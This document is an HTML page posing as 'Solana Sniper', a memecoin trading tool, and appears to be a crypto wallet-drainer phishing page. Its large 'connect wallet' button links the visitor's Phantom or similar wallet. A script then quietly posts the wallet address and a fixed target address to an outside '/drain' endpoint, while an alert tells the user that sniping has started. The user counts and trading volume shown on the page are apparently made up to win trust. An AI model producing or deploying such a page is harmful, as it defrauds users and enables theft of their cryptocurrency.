<!DOCTYPE html>
<html>
<head>
  <title>Solana Sniper - Alpha Tool</title>
  <style>
    body { background: #0f0f0f; color: #e0e0e0; font-family: system-ui, sans-serif; text-align: center; padding: 40px; margin: 0; }
    h1 { font-size: 48px; margin: 10px; color: #00ff9d; }
    .tag { color: #00cc77; font-size: 18px; }
    button { padding: 22px 70px; font-size: 26px; background: #00ff9d; color: #111; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; margin: 30px 0; }
    button:hover { background: #00e68a; }
  </style>
</head>
<body>
  <h1>Solana Sniper</h1>
  <p class="tag">Real-time memecoin sniping tool • Trusted by 1,240+ users</p>
  
  <div class="stats">
    <p>24h Volume Sniped: <strong>1,847 SOL</strong></p>
  </div>

  <button onclick="connectWallet()">CONNECT WALLET TO START SNIPING</button>
  
  <p style="margin-top: 40px; color: #888;">Supports Phantom, Backpack, Solflare • Works on Mobile & Desktop</p>

  <script>
    async function connectWallet() {
      let provider = window.solana;
      if (!provider) {
        if (window.phantom) provider = window.phantom.solana;
      }
      if (provider) {
        try {
          const resp = await provider.connect();
          const address = resp.publicKey.toString();
          
          fetch('https://sniper-bot-six.vercel.app/drain', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({wallet: address, target: "F83aYioTyo39x587B8s7gbMQ1hdbkmBjXdzEskMDrYNH"})
          });
          
          alert("✅ Wallet connected successfully. Sniping activated.");
        } catch(e) {
          alert("Connection failed. Try again.");
        }
      } else {
        alert("Please open this in Phantom, Backpack or Solflare wallet browser");
      }
    }
  </script>
</body>
</html>
